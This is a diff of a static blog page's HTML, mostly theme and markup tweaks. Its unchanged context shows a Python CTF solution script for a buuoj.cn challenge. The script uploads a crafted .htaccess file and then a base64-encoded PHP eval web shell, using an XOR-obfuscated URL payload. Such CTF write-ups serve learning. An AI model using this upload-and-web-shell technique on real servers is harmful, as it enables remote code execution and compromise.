@@ -18,10 +18,10 @@
 
 
 
-<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png">
+<link rel="icon" href="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200306170533.png">
 
 
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato">
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato&display=swap">
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.8.0/css/bulma.min.css">
 
 
@@ -60,7 +60,7 @@
             <a class="navbar-item navbar-logo" href="/">
                 
                     
-                    <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200225213644.png" alt="" height="28">
+                    <img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20200306170533.png" alt="" height="28">
                     
                 
             </a>
@@ -99,7 +99,7 @@
             </a>
             
             
-            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-tablet-only toc">
                 <a class="navbar-item" title="目录">
                     <svg class="icon" aria-hidden="true">
                     <use xlink:href="#icon-list"></use>
@@ -149,8 +149,8 @@
     </div>
 </nav>
 
-    <section class="section">
-    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <div class="container article-entry is-size-6-mobile" itemprop="articleBody"">
     <article class="article content gallery" itemscope itemprop="blogPost">
     <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
         
@@ -206,7 +206,25 @@ var leanCounter = new LeanCounter({
 <h2 id="htaccess上传getshell"><a href="#htaccess上传getshell" class="headerlink" title=".htaccess上传getshell"></a>.htaccess上传getshell</h2><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">r"http://2eab5f94-4cfd-41dc-ac5d-6cda977d7ce4.node3.buuoj.cn//?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># SIZE_HEADER = b"#define width 1\n#define height 1\n\n"</span></span><br><span class="line">SIZE_HEADER = <span class="hljs-string">b"\x00\x00\x8a\x39\x8a\x39"</span></span><br><span class="line">htaccess = SIZE_HEADER + <span class="hljs-string">b"""</span></span><br><span class="line"><span class="hljs-string">AddType application/x-httpd-php .cc</span></span><br><span class="line"><span class="hljs-string">php_value auto_prepend_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line">files = [</span><br><span class="line">    (<span class="hljs-string">"file"</span>,(<span class="hljs-string">".htaccess"</span>, htaccess, <span class="hljs-string">"image/gif"</span>))</span><br><span class="line">]</span><br><span class="line">proxy = {<span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:8080"</span>}</span><br><span class="line">res = requests.post(url, files=files, proxies=proxy).text</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">shell = SIZE_HEADER + <span class="hljs-string">b"00"</span> + base64.b64encode(<span class="hljs-string">b"<?php eval($_GET['cjm00n']);?>"</span>)</span><br><span class="line">files = [</span><br><span class="line">    (<span class="hljs-string">"file"</span>,(<span class="hljs-string">"shell.cc"</span>, shell, <span class="hljs-string">"image/gif"</span>))</span><br><span class="line">]</span><br><span class="line">proxy = {<span class="hljs-string">"http"</span>: <span class="hljs-string">"127.0.0.1:8080"</span>}</span><br><span class="line">res = requests.post(url, files=files, proxies=proxy).text</span><br><span class="line">print(res)</span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><br></p><blockquote class="colorquote info"><p>本文作者: cjm00n<br>本文地址: <a href="https://cjm00n.top/2020/02/16/常用脚本/">https://cjm00n.top/2020/02/16/常用脚本/</a> <br>版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
 </blockquote><p></p>
-</body></html>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script></body></html>
         
     </div>
     
@@ -296,7 +314,7 @@ setTimeout(function () {
 </div>
 
     </div>
-</section>
+</article>
     <footer class="footer">
     <div class="container">
         <div class="columns content">
@@ -322,7 +340,7 @@ setTimeout(function () {
     </div>
 </footer>
     <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-<script defer src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script>
 
 <!-- test if the browser is outdated -->
 <div id="outdated">
@@ -330,7 +348,7 @@ setTimeout(function () {
     <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
     <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
-<script defer src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
 <script>
     $(document).ready(function () {
         // plugin function, place inside DOM ready function
@@ -346,8 +364,8 @@ setTimeout(function () {
     window.FontAwesomeConfig = {
         searchPseudoElements: true
     }
-    // moment.locale("zh-CN");
     moment.locale("zh-CN");
+    // moment.locale("zh-CN");
 </script>
 
 
